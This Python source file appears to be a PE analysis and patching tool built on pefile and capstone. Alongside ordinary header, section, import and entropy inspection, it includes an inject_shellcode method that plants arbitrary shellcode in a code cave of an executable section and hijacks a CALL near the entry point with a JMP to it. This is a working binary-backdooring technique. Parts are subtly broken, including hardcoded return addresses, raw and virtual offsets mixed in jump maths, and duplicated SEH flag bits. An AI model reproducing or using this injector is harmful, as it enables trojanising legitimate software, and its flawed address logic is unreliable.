import pefile
import struct
from typing import Dict, List, Tuple, Optional, Union
import binascii
from capstone import Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64

# Add these at the top of the file, after the imports
def print_header(title: str):
    """Print a formatted header for major operations"""
    print("\n" + "=" * 60)
    print(f"[+] {title}")
    print("=" * 60)

def print_subheader(title: str):
    """Print a formatted subheader for sub-operations"""
    print("\n" + "-" * 40)
    print(f"[*] {title}")
    print("-" * 40)

def print_debug(message: str):
    """Print debug information in a consistent format"""
    print(f"[DEBUG] {message}")

def print_error(message: str):
    """Print error messages in a consistent format"""
    print(f"[-] ERROR: {message}")

def print_success(message: str):
    """Print success messages in a consistent format"""
    print(f"[+] SUCCESS: {message}")

class PEAnalyzer:
    def __init__(self, pe_path: str):
        """Initialize PE analyzer with file path"""
        self.pe_path = pe_path
        self.pe = pefile.PE(pe_path)
        # Initialize disassembler based on architecture
        if self.pe.FILE_HEADER.Machine == 0x8664:  # 64-bit
            self.disassembler = Cs(CS_ARCH_X86, CS_MODE_64)
        else:  # 32-bit
            self.disassembler = Cs(CS_ARCH_X86, CS_MODE_32)

    def get_file_headers(self) -> Dict:
        """Parse and return file headers information"""
        headers = {
            'Machine': hex(self.pe.FILE_HEADER.Machine),
            'TimeDateStamp': self.pe.FILE_HEADER.TimeDateStamp,
            'NumberOfSections': self.pe.FILE_HEADER.NumberOfSections,
            'Characteristics': hex(self.pe.FILE_HEADER.Characteristics),
            'EntryPoint': hex(self.pe.OPTIONAL_HEADER.AddressOfEntryPoint),
            'ImageBase': hex(self.pe.OPTIONAL_HEADER.ImageBase),
            'Subsystem': hex(self.pe.OPTIONAL_HEADER.Subsystem)
        }
        return headers

    def check_pe_architecture(self) -> str:
        try:
            if self.pe.FILE_HEADER.Machine == 0x8664:
                return "64-bit"
            elif self.pe.FILE_HEADER.Machine == 0x014c:
                return "32-bit"
            else:
                return "Unknown architecture"
        except Exception as e:
            return f"Error reading PE file: {e}"

    def get_sections_info(self) -> List[Dict]:
        """Get detailed information about all sections"""
        sections = []
        for section in self.pe.sections:
            section_info = {
                'Name': section.Name.decode().rstrip('\x00'),
                'VirtualAddress': hex(section.VirtualAddress),
                'VirtualSize': hex(section.Misc_VirtualSize),
                'RawSize': hex(section.SizeOfRawData),
                'Characteristics': hex(section.Characteristics),
            }
            sections.append(section_info)
        return sections

    def get_imports(self) -> Dict[str, List[str]]:
        """Get imported functions grouped by DLL"""
        imports = {}
        try:
            for entry in self.pe.DIRECTORY_ENTRY_IMPORT:
                dll_name = entry.dll.decode()
                imports[dll_name] = []
                for imp in entry.imports:
                    if imp.name:
                        imports[dll_name].append(imp.name.decode())
        except AttributeError:
            pass
        return imports

    def get_exports(self) -> List[str]:
        """Get list of exported functions"""
        exports = []
        try:
            for exp in self.pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if exp.name:
                    exports.append(exp.name.decode())
        except AttributeError:
            pass
        return exports

    def find_code_caves(self, min_size: int = 100, byte_pattern: bytes = b'\x00') -> Dict[str, List[Tuple[int, int]]]:
        """
        Find code caves in all sections
        
        Args:
            min_size: Minimum size of code cave to detect
            byte_pattern: Byte pattern to search for (default: null bytes)
            
        Returns:
            Dict with section names as keys and lists of (offset, size) tuples
        """
        caves = {}
        
        for section in self.pe.sections:
            section_name = section.Name.decode().rstrip('\x00')
            caves[section_name] = []
            
            data = section.get_data()
            cave_start = 0
            pattern_count = 0
            
            for i in range(len(data)):
                if data[i:i+len(byte_pattern)] == byte_pattern:
                    if pattern_count == 0:
                        cave_start = i
                    pattern_count += 1
                else:
                    if pattern_count >= min_size:
                        caves[section_name].append((
                            section.PointerToRawData + cave_start,
                            pattern_count
                        ))
                    pattern_count = 0
                    
            # Check for cave at end of section
            if pattern_count >= min_size:
                caves[section_name].append((
                    section.PointerToRawData + cave_start,
                    pattern_count
                ))
                
        return caves

    def detect_obfuscation(self) -> Dict[str, float]:
        """Detect possible obfuscation using entropy analysis"""
        obfuscation_info = {}
        for section in self.pe.sections:
            name = section.Name.decode().rstrip('\x00')
            entropy = section.get_entropy()
            obfuscation_info[name] = entropy
        return obfuscation_info

    def extract_strings(self, min_length: int = 4) -> List[str]:
        """Extract ASCII and Unicode strings from the PE file"""
        strings = []
        for section in self.pe.sections:
            data = section.get_data()
            
            # ASCII strings
            ascii_strings = []
            current_string = ''
            for byte in data:
                if 32 <= byte <= 126:  # Printable ASCII
                    current_string += chr(byte)
                else:
                    if len(current_string) >= min_length:
                        ascii_strings.append(current_string)
                    current_string = ''
                    
            # Unicode strings
            offset = 0
            while offset < len(data) - 1:
                if data[offset+1] == 0:  # Simple Unicode detection
                    current_string = ''
                    while offset < len(data) - 1 and data[offset+1] == 0:
                        if 32 <= data[offset] <= 126:
                            current_string += chr(data[offset])
                        offset += 2
                    if len(current_string) >= min_length:
                        strings.append(current_string)
                offset += 1
                
        return strings

    def get_data_directories(self) -> Dict[str, Dict]:
        """Get information about data directories"""
        directories = {}
        for entry in self.pe.OPTIONAL_HEADER.DATA_DIRECTORY:
            if entry.VirtualAddress != 0:
                directories[entry.name] = {
                    'VirtualAddress': hex(entry.VirtualAddress),
                    'Size': hex(entry.Size)
                }
        return directories

    def check_aslr(self) -> Dict[str, bool]:
        """
        Check if ASLR is enabled by verifying the DLL Characteristics flags
        
        Returns:
            Dict containing ASLR status and related security flags
        """
        characteristics = self.pe.OPTIONAL_HEADER.DllCharacteristics
        security_flags = {
            'ASLR': bool(characteristics & 0x0040),  # IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
            'DEP': bool(characteristics & 0x0100),   # IMAGE_DLLCHARACTERISTICS_NX_COMPAT
            'SEH': bool(characteristics & 0x0400),   # IMAGE_DLLCHARACTERISTICS_NO_SEH
            'SafeSEH': bool(characteristics & 0x0400),
            'CFG': bool(characteristics & 0x4000),   # IMAGE_DLLCHARACTERISTICS_GUARD_CF
            'Integrity': bool(characteristics & 0x8000)  # IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY
        }
        return security_flags

    def inject_shellcode(self, shellcode: bytes) -> Dict[str, Union[int, str, bytes]]:
        """Find best cave and inject shellcode with proper state preservation"""
        print_header("SHELLCODE INJECTION PROCESS")
        
        # Check architecture
        print_subheader("Checking PE Architecture")
        if self.pe.FILE_HEADER.Machine != 0x8664:
            raise ValueError("This injection method is only for 64-bit PE files")
        print_success("Valid 64-bit PE file detected")

        # State preservation prologue (x64)
        prologue = (
            # Save the current stack pointer (rsp)
            b"\x48\x89\xe0"  # mov rax, rsp
            b"\x50"  # push rax (original rsp)

            # Save flags and registers
            b"\x9C"  # pushfq (save flags)
            b"\x51"  # push rcx
            b"\x52"  # push rdx
            b"\x53"  # push rbx
            b"\x55"  # push rbp
            b"\x56"  # push rsi
            b"\x57"  # push rdi
            b"\x41\x50"  # push r8
            b"\x41\x51"  # push r9
            b"\x41\x52"  # push r10
            b"\x41\x53"  # push r11
            b"\x41\x54"  # push r12
            b"\x41\x55"  # push r13
            b"\x41\x56"  # push r14
            b"\x41\x57"  # push r15

            # Total bytes pushed so far = 8 (RSP) + 8 (flags) + 15 * 8 (registers) = 136 bytes
            # Since 136 is not a multiple of 16, we need to align the stack
            
            # Align the stack to 16 bytes (adjustment)
            b"\x48\x83\xec\x08"  # sub rsp, 8; Align rsp to 16 bytes (total now 144 bytes, which is a multiple of 16)
        )

        # State restoration epilogue (x64)
        epilogue = (
            # Restore stack alignment (remove extra alignment adjustment)
            b"\x48\x83\xc4\x08"  # add rsp, 8  Undo the alignment adjustment (8 bytes)

            # Restore registers in reverse order
            b"\x41\x5F"  # pop r15
            b"\x41\x5E"  # pop r14
            b"\x41\x5D"  # pop r13
            b"\x41\x5C"  # pop r12
            b"\x41\x5B"  # pop r11
            b"\x41\x5A"  # pop r10
            b"\x41\x59"  # pop r9
            b"\x41\x58"  # pop r8
            b"\x5F"  # pop rdi
            b"\x5E"  # pop rsi
            b"\x5D"  # pop rbp
            b"\x5B"  # pop rbx
            b"\x5A"  # pop rdx
            b"\x59"  # pop rcx
            b"\x9D"  # popfq (restore flags)
            b"\x58"          # pop rax (Pop original rsp value)
            b"\x48\x89\xe4"  # mov rsp, rax (Restore rsp)


        )

        # Wrap shellcode with state preservation
        protected_shellcode = prologue + shellcode + epilogue
        
        # Find suitable cave
        print_subheader("Searching for Code Cave")
        caves = self.find_code_caves(min_size=len(protected_shellcode))
        best_cave = None
        best_section = None
        
        for section in self.pe.sections:
            section_name = section.Name.decode().rstrip('\x00')
            if section.Characteristics & 0x20000000:
                print_debug(f"Checking executable section: {section_name}")
                if section_name in caves and caves[section_name]:
                    for cave_addr, cave_size in caves[section_name]:
                        if cave_size >= len(protected_shellcode):
                            best_cave = (cave_addr, cave_size)
                            best_section = section
                            print_success(f"Suitable cave found in section {section_name}")
                            print_debug(f"Cave address: 0x{cave_addr:08x}")
                            print_debug(f"Cave size: {cave_size} bytes")
                            break
            if best_cave:
                break

        if not best_cave:
            raise ValueError("No suitable code cave found for shellcode")

        # Find entry point section
        print_subheader("Locating Entry Point Section")
        original_entry = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
        print_debug(f"Original entry point: 0x{original_entry:08x}")

        call_func_to_overwrite = self.find_first_instruction("call", best_section.Name.decode().rstrip('\x00'), original_entry)
        
        # Backup original bytes
        original_bytes_overwritten = self.read_bytes(call_func_to_overwrite['address'], 5, best_section.Name.decode().rstrip('\x00'))
        self.print_instructions(call_func_to_overwrite['address'], 5, best_section.Name.decode().rstrip('\x00'))
        
        # Calculate addresses
        cave_rva = best_cave[0] - best_section.VirtualAddress
        print(f"[DEBUG] Cave RVA: 0x{cave_rva:08x}")
        
        # Create JMP instruction to our cave
        jump_distance = best_cave[0] - (call_func_to_overwrite['address'] + 5)
        # print(f"[DEBUG] Jump distance: 0x{jump_distance:08x}")
        jmp_code = b'\xE9' + struct.pack('<I', jump_distance)

        # Calculate the relative offset for the CALL instruction

        call_target = best_cave[0] + len(protected_shellcode)
        target_address = 0x00001164

        # Calculate the relative offset for the call instruction from call_target to target_address
        # The offset should be: target_address - (call_target + length_of_CALL_instruction)
        next_instruction_address = call_target + 5  # Length of the CALL instruction is 5 bytes
        call_distance = target_address - next_instruction_address

        print(f"[DEBUG] call_distance: 0x{call_distance:08x}")
        print(f"[DEBUG] call_target: 0x{call_target:08x}")

        # Create the CALL instruction
        call_instruction = b'\xE8' + struct.pack('<i', call_distance)
        protected_shellcode += call_instruction

       # Prepare return jump to original entry
        jmp_target=best_cave[0] + len(protected_shellcode)
        target_address = 0x000014c0

        next_instruction_address = jmp_target + 5  # Length of the CALL instruction is 5 bytes
        jmp_distance = target_address - next_instruction_address

        print(f"[DEBUG] call_distance: 0x{call_distance:08x}")
        print(f"[DEBUG] call_target: 0x{call_target:08x}")

        # Create the CALL instruction
        return_jmp = b'\xE9' + struct.pack('<i', jmp_distance)
        protected_shellcode += return_jmp
        
        # Append the CALL instruction to the shellcode
        final_code = protected_shellcode

        
        try:
            # Write shellcode to cave
            self.write_bytes(best_cave[0], final_code)
            
            # overwrite CALL function to JMP at entry point
            
            entry_raw = self.rva_to_raw(call_func_to_overwrite['address'], best_section.Name.decode().rstrip('\x00'))
            self.write_bytes(entry_raw, jmp_code)
            
            return {
                'status': 'success',
                'cave_address': hex(best_cave[0]),
                'cave_size': best_cave[1],
                'section': best_section.Name.decode().rstrip('\x00'),
                'original_entry': original_entry,  # Store as int for easier restoration
                'original_entry_section': best_section.Name.decode().rstrip('\x00'),
                'shellcode_size': len(protected_shellcode)
            }
            
        except Exception as e:
            raise RuntimeError(f"Failed to inject shellcode: {str(e)}")

    def write_bytes(self, offset: int, data: bytes) -> None:
        """Write bytes to the PE file at specified offset"""
        with open(self.pe_path, 'r+b') as f:
            f.seek(offset)
            f.write(data)

    def read_bytes(self, rva: int, size: int, section_name: str = None) -> bytes:
        """Read bytes from the PE file at specified RVA"""
        raw_offset = self.rva_to_raw(rva, section_name)
        with open(self.pe_path, 'rb') as f:
            f.seek(raw_offset)
            return f.read(size)
        
    def rva_to_raw(self, rva: int, section_name: str = None) -> int:
        """Convert RVA to raw file offset"""
        if section_name:
            for section in self.pe.sections:
                curr_name = section.Name.decode().rstrip('\x00')
                if curr_name == section_name:
                    # Check boundaries based on SizeOfRawData to avoid misalignment issues
                    if section.VirtualAddress <= rva < section.VirtualAddress + section.SizeOfRawData:
                        raw_offset = section.PointerToRawData + (rva - section.VirtualAddress)
                        print(f"[DEBUG] Raw Offset: 0x{raw_offset:08x}")
                        return raw_offset
                else:
                    print(f"[ERROR] RVA 0x{rva:08x} out of bounds for section {section_name}")
        raise ValueError(f"Could not convert RVA 0x{rva:08x} to raw offset in section {section_name}")

    def restore_original_entry(self, original_bytes: bytes, original_entry: int, section_name: str) -> bool:
        """
        Restore the original entry point bytes
        
        Args:
            original_bytes: The original bytes that were at the entry point
            original_entry: The RVA of the entry point
            section_name: Name of the section containing the entry point
            
        Returns:
            bool: True if restoration was successful
        """
        try:
            # Convert entry RVA to raw offset
            entry_raw = self.rva_to_raw(original_entry, section_name)
            
            # Write original bytes back
            self.write_bytes(entry_raw, original_bytes)
            print(f"[+] Successfully restored original entry point at RVA: 0x{original_entry:08x}")
            return True
            
        except Exception as e:
            print(f"[-] Failed to restore original entry point: {str(e)}")
            return False

    def print_instructions(self, address: int, size: int = 32, section_name: str = None) -> List[Dict]:
        """
        Disassemble and print instructions at specified address
        
        Args:
            address: RVA of the code to disassemble
            size: Number of bytes to disassemble (default: 32)
            section_name: Name of the section containing the code
            
        Returns:
            List of dictionaries containing instruction details
        """
        try:
            # Read the bytes at the specified address
            code_bytes = self.read_bytes(address, size, section_name)
            
            instructions = []
            print(f"\nDisassembly at address 0x{address:08x}:")
            print("-" * 50)
            
            # Disassemble the code
            for insn in self.disassembler.disasm(code_bytes, address):
                instruction = {
                    'address': f"0x{insn.address:08x}",
                    'bytes': ' '.join([f"{b:02x}" for b in insn.bytes]),
                    'mnemonic': insn.mnemonic,
                    'op_str': insn.op_str
                }
                instructions.append(instruction)
                
                # Print formatted instruction
                print(f"0x{insn.address:08x}: {instruction['bytes']:24} {insn.mnemonic:8} {insn.op_str}")
            
            return instructions
            
        except Exception as e:
            print(f"[-] Failed to disassemble at address 0x{address:08x}: {str(e)}")
            return []

    def find_first_instruction(self, instruction: str, section_name: str, start_rva: int = None) -> Optional[Dict]:
        """Find the first occurrence of a specific instruction"""
        print_subheader(f"Searching for First '{instruction.upper()}' Instruction")
        try:
            target_section = None
            for section in self.pe.sections:
                if section.Name.decode().rstrip('\x00') == section_name:
                    target_section = section
                    break
                    
            if not target_section:
                print_error(f"Section {section_name} not found")
                return None
                
            search_start = start_rva if start_rva else target_section.VirtualAddress
            search_size = target_section.SizeOfRawData
            
            print_debug(f"Search start: 0x{search_start:08x}")
            print_debug(f"Search size: {search_size} bytes")
            
            section_data = self.read_bytes(search_start, search_size, section_name)
            
            for insn in self.disassembler.disasm(section_data, search_start):
                if insn.mnemonic.lower() == instruction.lower():
                    result = {
                        'address': insn.address,
                        'bytes': bytes(insn.bytes),
                        'size': len(insn.bytes),
                        'mnemonic': insn.mnemonic,
                        'op_str': insn.op_str
                    }
                    print_success(f"Found {instruction} at 0x{insn.address:08x}")
                    print_debug(f"Instruction: {insn.mnemonic} {insn.op_str}")
                    print_debug(f"Size: {len(insn.bytes)} bytes")
                    return result
                    
            print_error(f"No {instruction} instruction found")
            return None
                
        except Exception as e:
            print_error(f"Error finding instruction: {str(e)}")
            return None

    